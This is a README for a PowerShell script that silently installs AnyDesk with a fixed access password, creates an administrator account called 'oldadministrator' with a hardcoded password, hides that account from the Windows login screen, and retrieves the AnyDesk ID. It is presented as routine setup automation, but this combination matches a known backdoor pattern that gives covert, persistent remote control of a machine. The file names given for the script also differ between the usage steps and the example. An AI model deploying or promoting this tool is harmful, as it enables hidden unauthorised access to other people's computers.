# AnyDesk Installation and Configuration Script

This PowerShell script automates the installation and initial configuration of the AnyDesk remote desktop application on Windows systems. It also creates a new user account with administrative privileges for AnyDesk access. This README provides an overview of the script and instructions for usage.

## Features

- Downloads and installs AnyDesk silently.
- Sets a password for AnyDesk for added security.
- Creates a new user account with administrative privileges.
- Hides the new user account from the Windows login screen.
- Retrieves the AnyDesk ID for future reference.

## Requirements

- Windows operating system.
- PowerShell 5.1 or later.
- Internet access to download AnyDesk.

## Usage

1. Clone or download this repository to your Windows machine.

2. Open PowerShell with administrator privileges.

3. Navigate to the directory where the script is located.

4. Run the script by executing the following command:
   ```powershell
   .\Hydra-AnyDesk.ps1
   ```

5. Follow the prompts to customize the installation path, AnyDesk URL, passwords, and usernames (optional).

6. The script will install AnyDesk and perform the necessary configuration tasks.

## Customization

The script can be customized using the following parameters when running it:

- `-InstallPath`: Specify the installation path for AnyDesk. Default is "C:\ProgramData\AnyDesk".
- `-AnyDeskUrl`: Specify the URL to download AnyDesk. Default is "http://download.anydesk.com/AnyDesk.exe".
- `-Password`: Set the AnyDesk password. Default is "J9kzQ2Y0qO".
- `-AdminUsername`: Set the username for the new administrator account. Default is "oldadministrator".
- `-AdminPassword`: Set the password for the new administrator account. Default is "jsbehsid#Zyw4E3".

Example:
```powershell
.\Install-AnyDesk.ps1 -InstallPath "C:\CustomPath" -AdminUsername "myadmin" -AdminPassword "mypassword"
```

## Error Handling

The script includes error handling to gracefully handle failures during installation. Any errors encountered will be displayed, and the installation status will be reported.

## Security Considerations

- Be cautious when automating administrative tasks and ensure that you understand the implications of creating new user accounts with administrative privileges.
- Always use strong, unique passwords for security.
- Prompt for sensitive information instead of hardcoding it for better security.
